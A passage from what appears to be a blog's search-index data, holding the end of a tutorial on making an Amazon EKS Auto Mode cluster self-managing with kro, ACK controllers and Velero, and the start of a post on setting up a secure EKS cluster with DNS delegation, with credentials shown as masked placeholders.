publicSubnet2Cidr: \"string | default=\\\"192.168.32.0/19\\\"\" privateSubnet1Cidr: \"string | default=\\\"192.168.64.0/19\\\"\" privateSubnet2Cidr: \"string | default=\\\"192.168.96.0/19\\\"\" status: clusterARN: ${cluster.status.ackResourceMetadata.arn} clusterStatus: ${cluster.status.status} vpcID: ${eksVpc.status.vpcID} privateSubnet1ID: ${eksVpc.status.privateSubnet1ID} privateSubnet2ID: ${eksVpc.status.privateSubnet2ID} kmsKeyARN: ${kmsKey.status.keyARN} s3BucketARN: ${s3Bucket.status.bucketARN} resources: - id: kmsKey template: apiVersion: kro.run/v1alpha1 kind: KmsKey metadata: name: \"${schema.spec.name}-kms\" spec: name: \"${schema.spec.name}\" accountId: \"${schema.spec.accountId}\" region: ${schema.spec.region} - id: s3Bucket template: apiVersion: kro.run/v1alpha1 kind: S3Bucket metadata: name: \"${schema.spec.name}-s3\" spec: bucketName: ${schema.spec.s3BucketName} region: ${schema.spec.region} kmsKeyARN: ${kmsKey.status.keyARN} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: cloudWatchLogGroup template: apiVersion: kro.run/v1alpha1 kind: EksCloudWatchLogGroup metadata: name: \"${schema.spec.name}-logs\" spec: name: \"${schema.spec.name}\" kmsKeyARN: ${kmsKey.status.keyARN} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: eksVpc template: apiVersion: kro.run/v1alpha1 kind: EksVpc metadata: name: \"${schema.spec.name}-vpc\" spec: name: \"${schema.spec.name}\" region: ${schema.spec.region} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" cidr: vpcCidr: ${schema.spec.cidr.vpcCidr} publicSubnet1Cidr: ${schema.spec.cidr.publicSubnet1Cidr} publicSubnet2Cidr: ${schema.spec.cidr.publicSubnet2Cidr} privateSubnet1Cidr: ${schema.spec.cidr.privateSubnet1Cidr} privateSubnet2Cidr: ${schema.spec.cidr.privateSubnet2Cidr} - id: clusterRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-eks-auto-mode-cluster-role\" spec: name: \"${schema.spec.name}-eks-auto-mode-cluster-role\" description: \"EKS Auto Mode Cluster IAM role\" policies: - arn:aws:iam::aws:policy/AmazonEKSClusterPolicy - arn:aws:iam::aws:policy/AmazonEKSComputePolicy - arn:aws:iam::aws:policy/AmazonEKSBlockStoragePolicy - arn:aws:iam::aws:policy/AmazonEKSLoadBalancingPolicy - arn:aws:iam::aws:policy/AmazonEKSNetworkingPolicy assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"eks.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: nodeRole template: apiVersion: iam.services.k8s.aws/v1alpha1 kind: Role metadata: name: \"${schema.spec.name}-ng-role\" spec: name: \"${schema.spec.name}-nodegroup-${schema.spec.name}-ng-NodeRole\" assumeRolePolicyDocument: | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": [ \"sts:AssumeRole\", \"sts:TagSession\" ] } ] } policies: - \"arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy\" - \"arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore\" tags: - key: owner value: \"${schema.spec.tags.owner}\" - key: environment value: \"${schema.spec.tags.environment}\" - key: cluster value: \"${schema.spec.tags.cluster}\" - id: cluster readyWhen: - '${cluster.status.status == \"ACTIVE\"}' template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: Cluster metadata: name: ${schema.spec.name} annotations: clusterRoleArn: ${clusterRole.status.ackResourceMetadata.arn} spec: name: ${schema.spec.name} roleARN: ${clusterRole.status.ackResourceMetadata.arn} version: ${schema.spec.k8sVersion} accessConfig: authenticationMode: API_AND_CONFIG_MAP bootstrapClusterCreatorAdminPermissions: true computeConfig: enabled: true nodeRoleARN: ${nodeRole.status.ackResourceMetadata.arn} nodePools: - system - general-purpose kubernetesNetworkConfig: ipFamily: ipv4 elasticLoadBalancing: enabled: true logging: clusterLogging: - enabled: true types: - api - audit - authenticator - controllerManager - scheduler storageConfig: blockStorage: enabled: true resourcesVPCConfig: endpointPrivateAccess: ${schema.spec.vpcConfig.endpointPrivateAccess} endpointPublicAccess: ${schema.spec.vpcConfig.endpointPublicAccess} subnetIDs: - ${eksVpc.status.privateSubnet1ID} - ${eksVpc.status.privateSubnet2ID} encryptionConfig: - provider: keyARN: ${kmsKey.status.keyARN} resources: - secrets tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" - id: addonPodIdentity template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: Addon metadata: name: ${schema.spec.name}-pod-identity annotations: cluster-arn: ${cluster.status.ackResourceMetadata.arn} spec: name: eks-pod-identity-agent clusterName: ${cluster.spec.name} - id: accessEntry template: apiVersion: eks.services.k8s.aws/v1alpha1 kind: AccessEntry metadata: name: ${schema.spec.name}-admin-access # Reference cluster.status to ensure kro waits for cluster to be ACTIVE annotations: cluster-arn: ${cluster.status.ackResourceMetadata.arn} spec: clusterName: ${cluster.spec.name} principalARN: ${schema.spec.adminRoleARN} type: STANDARD accessPolicies: - policyARN: \"arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy\" accessScope: type: cluster - id: podIdentityAssociations template: apiVersion: kro.run/v1alpha1 kind: PodIdentityAssociations metadata: name: \"${schema.spec.name}-pod-identity-associations\" spec: name: ${schema.spec.name} clusterName: ${schema.spec.name} accountId: \"${schema.spec.accountId}\" s3BucketName: ${schema.spec.s3BucketName} tags: owner: \"${schema.spec.tags.owner}\" environment: \"${schema.spec.tags.environment}\" cluster: \"${schema.spec.tags.cluster}\" EOF kubectl wait --for=jsonpath='{.status.state}'=Active resourcegraphdefinition/eks-auto-mode-cluster -n kro-system --timeout=5m Create EKS Auto Mode Cluster Instance Now create a single instance that provisions the EKS cluster using the expanded combined RGD: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/kro-eks-auto-mode-cluster.yaml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: kro.run/v1alpha1 kind: EksAutoModeCluster metadata: name: ${CLUSTER_NAME} namespace: kro-system spec: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} accountId: \"${AWS_ACCOUNT_ID}\" adminRoleARN: \"${AWS_ROLE_TO_ASSUME%/*}/admin\" s3BucketName: ${CLUSTER_FQDN} tags: owner: ${MY_EMAIL} environment: dev cluster: ${CLUSTER_FQDN} EOF kubectl wait --for=condition=Ready \"eksautomodecluster/${CLUSTER_NAME}\" -n kro-system --timeout=30m Install Velero Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"11.3.2\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.13.2 volumeMounts: - mountPath: /target name: plugins upgradeCRDs: false configuration: backupStorageLocation: - name: default provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} credentials: useSecret: true secretContents: cloud: | [default] aws_access_key_id=${AWS_ACCESS_KEY_ID} aws_secret_access_key=${AWS_SECRET_ACCESS_KEY} aws_session_token=${AWS_SESSION_TOKEN} snapshotsEnabled: false EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/helm_values-velero.yml\" velero vmware-tanzu/velero Create a Velero backup for kro and ACK resources. Use resource filtering with API group wildcards to capture kro.run objects (cluster-scoped RGDs and namespaced instances) and services.k8s.aws objects (ACK-managed AWS resources), all scoped to the kro-system namespace: tee \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap/velero-kro-ack-backup.yaml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: velero.io/v1 kind: Backup metadata: name: kro-ack-backup namespace: velero spec: # Include kro-system namespace where kro instances are created includedNamespaces: - kro-system # Include cluster-scoped kro resources (ResourceGraphDefinitions) includedClusterScopedResources: - \"*.kro.run\" # Include namespaced kro instances and ACK resources (with status) includedNamespaceScopedResources: - \"*.kro.run\" - \"*.services.k8s.aws\" EOF Migrate Bootstrap Resources to EKS Auto Mode Cluster At this point the Kind cluster has done its job: the EKS Auto Mode Cluster is running in AWS, the S3 bucket exists, and a Velero backup of all kro and ACK resources is stored in S3. The remaining steps switch context to the new EKS cluster and make it self-managing: Configure kubectl access to the EKS Auto Mode Cluster Install kro, ACK controllers, and Velero on the EKS cluster (all with zero replicas to prevent premature reconciliation) Restore the Velero backup so that kro and ACK resources appear with their existing AWS resource ARNs intact Scale controllers back up — they adopt existing AWS resources instead of creating duplicates Delete the Kind bootstrap cluster Configure Access to EKS Auto Mode Cluster Update kubeconfig for the new EKS Auto Mode cluster: export KUBECONFIG=\"${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf\" aws eks update-kubeconfig --region \"${AWS_DEFAULT_REGION}\" --name \"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" Install kro on EKS Auto Mode Cluster Install kro on the EKS Auto Mode Cluster with zero replicas — the same approach used for ACK below. kro’s CRDs are registered but the controller does not reconcile until after the Velero restore completes: # renovate: datasource=docker depName=registry.k8s.io/kro/charts/kro KRO_HELM_CHART_VERSION=\"0.8.5\" helm upgrade --install --namespace kro-system --create-namespace --set deployment.replicaCount=0 --version=${KRO_HELM_CHART_VERSION} kro oci://registry.k8s.io/kro/charts/kro Install ACK Controllers on EKS Auto Mode Cluster Install ACK controllers with deployment.replicas: 0 so the controllers install their CRDs but do not start reconciling. This prevents a race condition during the Velero restore: Velero restores CRs in two steps (create without status, then patch /status). If ACK controllers are running during the create step, they see a CR with no ARN in .status.ackResourceMetadata and attempt to create new AWS resources - duplicating ones that already exist. Deploying with zero replicas eliminates this window; the controllers are scaled back up after the restore completes and all status fields are in place: # renovate: datasource=github-tags depName=aws-controllers-k8s/ack-chart ACK_HELM_CHART_VERSION=\"46.75.1\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ack.yml\" &lt;&lt; EOF eks: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} ec2: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} iam: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} kms: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} cloudwatchlogs: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} s3: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} EOF helm upgrade --install --version=${ACK_HELM_CHART_VERSION} --namespace ack-system --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ack.yml\" ack oci://public.ecr.aws/aws-controllers-k8s/ack-chart Install Velero on EKS Auto Mode Cluster Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"11.3.2\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.13.2 volumeMounts: - mountPath: /target name: plugins upgradeCRDs: false configuration: backupStorageLocation: - name: default provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} snapshotsEnabled: false EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" velero vmware-tanzu/velero Wait for the kro-ack-backup to appear in the Velero backup list (synced from the S3 bucket): while ! kubectl get backup -n velero kro-ack-backup 2&gt; /dev/null; do echo \"Waiting for kro-ack-backup to appear...\" sleep 5 done Restore kro and ACK Resources to EKS Create restore from backup: tee \"${TMP_DIR}/${CLUSTER_FQDN}/velero-kro-ack-restore.yaml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: velero.io/v1 kind: Restore metadata: name: kro-ack-restore namespace: velero spec: backupName: kro-ack-backup restoreStatus: includedResources: - \"*\" EOF kubectl wait --for=jsonpath='{.status.phase}'=Completed restore/kro-ack-restore -n velero Scale kro and ACK controllers back up. When the controllers start, every CR already has its ARN in .status.ackResourceMetadata, so they reconcile with existing AWS resources instead of creating duplicates: kubectl scale deploy -n kro-system kro --replicas=1 for DEPLOY in $(kubectl get deploy -n ack-system -o name); do kubectl scale \"${DEPLOY}\" -n ack-system --replicas=1 done Verify the restore. ACK resources have their .status fields intact (containing AWS resource IDs), and kro resources recognize their managed ACK resources: kubectl get resourcegraphdefinition for RESOURCE in $(kubectl api-resources --api-group kro.run --no-headers | awk '!/resourcegraphdefinition/{print $1}'); do echo -e \"\\n=== ${RESOURCE} ===\" kubectl get \"${RESOURCE}\" -A done NAME APIVERSION KIND STATE AGE eks-auto-mode-cluster v1alpha1 EksAutoModeCluster Active 9s ekscloudwatchloggroup v1alpha1 EksCloudWatchLogGroup Active 9s eksvpc v1alpha1 EksVpc Active 9s kmskey v1alpha1 KmsKey Active 9s podidentityassociations v1alpha1 PodIdentityAssociations Active 9s s3-velero-bucket v1alpha1 S3Bucket Active 9s === eksautomodeclusters === NAMESPACE NAME STATE READY AGE kro-system k02 ACTIVE True 12s === ekscloudwatchloggroups === NAMESPACE NAME STATE READY AGE kro-system k02-logs ACTIVE True 13s === eksvpcs === NAMESPACE NAME STATE READY AGE kro-system k02-vpc ACTIVE True 14s === kmskeys === NAMESPACE NAME STATE READY AGE kro-system k02-kms ACTIVE True 14s === podidentityassociations === NAMESPACE NAME CLUSTER NAMESPACE SERVICEACCOUNT SYNCED AGE kro-system k02-ack-system-ack-cloudwatchlogs-controller k02 ack-system ack-cloudwatchlogs-controller True 15s kro-system k02-ack-system-ack-ec2-controller k02 ack-system ack-ec2-controller True 14s kro-system k02-ack-system-ack-eks-controller k02 ack-system ack-eks-controller True 14s kro-system k02-ack-system-ack-iam-controller k02 ack-system ack-iam-controller True 14s kro-system k02-ack-system-ack-kms-controller k02 ack-system ack-kms-controller True 14s kro-system k02-ack-system-ack-s3-controller k02 ack-system ack-s3-controller True 14s kro-system k02-velero-velero k02 velero velero-server True 14s === s3buckets === NAMESPACE NAME STATE READY AGE kro-system k02-s3 ACTIVE True 14s Delete the restore: kubectl delete restore kro-ack-restore -n velero The EKS Auto Mode cluster is now managing its own infrastructure through kro and ACK resources that were migrated from the Kind cluster. Remove the bootstrap Kind cluster: kind delete cluster --name \"kind-${CLUSTER_NAME}-bootstrap\" Cleanup Define environment variables and workspace paths for cleanup tasks: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"k02.k8s.mylabs.dev\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup\" Create the Kind cluster: kind create cluster --name \"kind-${CLUSTER_NAME}-cleanup\" --kubeconfig \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup/kubeconfig-kind-${CLUSTER_NAME}-cleanup.yaml\" export KUBECONFIG=\"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup/kubeconfig-kind-${CLUSTER_NAME}-cleanup.yaml\" Install kro using Helm: # renovate: datasource=docker depName=registry.k8s.io/kro/charts/kro KRO_HELM_CHART_VERSION=\"0.8.5\" helm upgrade --install --version=${KRO_HELM_CHART_VERSION} --namespace kro-system --create-namespace --set deployment.replicas=0 kro oci://registry.k8s.io/kro/charts/kro Create namespace and configure AWS credentials for ACK: kubectl create namespace ack-system set +x kubectl -n ack-system create secret generic aws-credentials --from-literal=credentials=\"[default] aws_access_key_id=${AWS_ACCESS_KEY_ID} aws_secret_access_key=${AWS_SECRET_ACCESS_KEY} aws_session_token=${AWS_SESSION_TOKEN} aws_role_to_assume=${AWS_ROLE_TO_ASSUME}\" set -x Install ACK controllers with deployment.replicas: 0 — CRDs are registered but controllers stay idle until the restore populates .status fields (same race-condition guard as the main cluster): # renovate: datasource=github-tags depName=aws-controllers-k8s/ack-chart ACK_HELM_CHART_VERSION=\"46.75.1\" cat &gt; \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup/helm_values-ack.yml\" &lt;&lt; EOF eks: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials ec2: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials iam: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials kms: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials cloudwatchlogs: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials s3: enabled: true deployment: replicas: 0 aws: region: ${AWS_DEFAULT_REGION} credentials: secretName: aws-credentials EOF helm upgrade --install --version=${ACK_HELM_CHART_VERSION} --namespace ack-system --values \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup/helm_values-ack.yml\" ack oci://public.ecr.aws/aws-controllers-k8s/ack-chart Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"11.3.2\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.13.2 volumeMounts: - mountPath: /target name: plugins upgradeCRDs: false configuration: backupStorageLocation: - name: default provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} credentials: useSecret: true secretContents: cloud: | [default] aws_access_key_id=${AWS_ACCESS_KEY_ID} aws_secret_access_key=${AWS_SECRET_ACCESS_KEY} aws_session_token=${AWS_SESSION_TOKEN} snapshotsEnabled: false EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup/helm_values-velero.yml\" velero vmware-tanzu/velero while ! kubectl get backup -n velero kro-ack-backup 2&gt; /dev/null; do echo \"Waiting for kro-ack-backup to appear...\" sleep 5 done Restore kro and ACK resources from the Velero backup: tee \"${TMP_DIR}/${CLUSTER_FQDN}/velero-kro-ack-restore.yaml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: velero.io/v1 kind: Restore metadata: name: kro-ack-restore namespace: velero spec: backupName: kro-ack-backup existingResourcePolicy: update restoreStatus: includedResources: - \"*\" EOF kubectl wait --for=jsonpath='{.status.phase}'=Completed restore/kro-ack-restore -n velero Scale kro and ACK controllers back up so they can reconcile the restored resources: kubectl scale deploy -n kro-system kro --replicas=1 for DEPLOY in $(kubectl get deploy -n ack-system -o name); do kubectl scale \"${DEPLOY}\" -n ack-system --replicas=1 done Delete the Velero backup, remove the restore, and delete the EKS Auto Mode Cluster along with all kro-managed AWS resources: kubectl apply -n velero -f - &lt;&lt; EOF || true apiVersion: velero.io/v1 kind: DeleteBackupRequest metadata: name: kro-ack-backup-delete namespace: velero spec: backupName: kro-ack-backup EOF kubectl delete restore kro-ack-restore -n velero Delete the EKS Auto Mode Cluster kro instance and all its kro-managed AWS resources. First, patch the S3Bucket CR to remove its finalizer — this is needed because a field-ownership conflict between Velero’s restore and kro’s Server-Side Apply prevents kro from cleaning it up automatically, which would cause the delete to hang indefinitely: # Workaround: after Velero restore, Server-Side Apply field ownership prevents # KRO from removing its own finalizer from the S3Bucket CR. The finalizer is # owned by Velero's field manager, so KRO's SSA patch silently fails to remove # it, causing deletion to hang indefinitely. kubectl patch s3buckets k02-s3 -n kro-system --type=json -p='[{\"op\": \"remove\", \"path\": \"/metadata/finalizers/0\"}]' kubectl delete eksautomodeclusters.kro.run -n kro-system \"${CLUSTER_NAME}\" --timeout=10m || true Delete all the kind clusters: kind delete cluster --name \"kind-${CLUSTER_NAME}-bootstrap\" kind delete cluster --name \"kind-${CLUSTER_NAME}-cleanup\" Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: set +e if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \\ \"${TMP_DIR}/${CLUSTER_FQDN}\"/{helm_values-ack.yml,helm_values-velero.yml,kubeconfig-${CLUSTER_NAME}.conf,velero-kro-ack-restore.yaml} \\ \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap\"/{helm_values-ack.yml,helm_values-velero.yml,kro-eks-auto-mode-cluster-rgd.yaml,kro-eks-auto-mode-cluster.yaml,kro-ekscloudwatchloggroup-loggroup-rgd.yaml,kro-eksvpc-rgd.yaml,kro-kmskey-rgd.yaml,kro-podidentityassociations-rgd.yaml,kro-s3bucket-rgd.yaml,\"kubeconfig-kind-${CLUSTER_NAME}-bootstrap.yaml\",velero-kro-ack-backup.yaml} \\ \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup\"/{kubeconfig-kind-${CLUSTER_NAME}-cleanup.yaml,helm_values-ack.yml,helm_values-velero.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"❌ File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" \"${TMP_DIR}/kind-${CLUSTER_NAME}-bootstrap\" \"${TMP_DIR}/kind-${CLUSTER_NAME}-cleanup\" fi set -e Enjoy your self-managed EKS cluster with ACK and kro… 😉" }, { "title": "Amazon EKS and Grafana stack", "url": "/posts/amazon-eks-grafana-stack/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security, eksctl, cert-manager, external-dns, prometheus, grafana, sso", "date": "2026-01-13 00:00:00 +0100", "content": "I will outline the steps for setting up an Amazon EKS environment that prioritizes security, including the configuration of standard applications. The Amazon EKS setup should align with the following criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Leverage Network Load Balancer (NLB) for highly cost-effective and optimized load balancing Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted EKS cluster logging to CloudWatch must be configured Network Policies should be enabled where supported EKS Pod Identities should be used to allow applications and pods to communicate with AWS APIs Build Amazon EKS Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables: # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" export AWS_PARTITION=\"aws\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to Amazon Route 53 nameservers. Here’s how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation’s specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create the service-linked role Creating the 